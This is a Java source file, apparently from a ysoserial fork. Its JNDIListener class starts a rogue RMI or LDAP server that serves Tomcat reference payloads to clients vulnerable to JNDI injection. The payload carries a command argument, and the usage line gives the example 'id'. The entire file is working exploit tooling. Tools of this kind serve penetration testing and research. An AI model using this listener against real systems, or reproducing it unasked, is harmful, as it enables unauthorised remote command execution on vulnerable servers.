package ysoserial.exploit;

import ysoserial.Strings;
import ysoserial.bullet.jndi.ReferencePayload;
import ysoserial.exploit.ldap.LDAPTomcatRefListener;
import ysoserial.exploit.rmi.RMITomcatRefListener;

import java.net.URI;
import java.util.*;

public class JNDIListener {
    public static void main(String[] args) {
        if ( args.length != 3 ) {
            printUsage();
            System.exit(-1);
            return;
        }

        try {
            String refClassName = args[1];
            final Class<? extends ReferencePayload> refClass = ReferencePayload.Utils.getPayloadClass(refClassName);
            if (refClass == null) {
                System.err.println("Invalid reference type '" + refClassName + "'");
                printUsage();
                System.exit(-1);
                return;
            }
            ReferencePayload refObj = refClass.newInstance();

            URI urlParsed = new URI(args[0]);
            String host = urlParsed.getHost();
            int port = urlParsed.getPort();
            String objectName = urlParsed.getPath().substring(1);

            System.out.println("[+]Listening on " + args[0]);
            if (urlParsed.getScheme().equals("rmi")) {
                new RMITomcatRefListener(host, port, objectName, refObj, args[2]);
            } else if (urlParsed.getScheme().equals("ldap")) {
                LDAPTomcatRefListener ldapTomcatRefListener = new LDAPTomcatRefListener(port, refObj, args[2]);
                ldapTomcatRefListener.run();
            }
        } catch ( Exception e ) {
            System.err.println("[-]Listener error...");
            e.printStackTrace(System.err);
        }
    }

    private static void printUsage() {
        System.err.println("[+]JNDI Listener");
        System.err.println("Usage:    java -cp ysoserial.jar ysoserial.exploit.JNDIListener <url> <ref_type> <payload_arg>");
        System.err.println("Example:  java -cp ysoserial.jar ysoserial.exploit.JNDIListener rmi://localhost:1099/objName TomcatRef 'id'");
        System.err.println("  Available reference types:");

        final List<Class<? extends ReferencePayload>> payloadClasses =
            new ArrayList<Class<? extends ReferencePayload>>(ReferencePayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator());

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[] {"Reference type"});
        rows.add(new String[] {"--------------"});
        for (Class<? extends ReferencePayload> payloadClass : payloadClasses) {
            rows.add(new String[] {
                payloadClass.getSimpleName(),
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
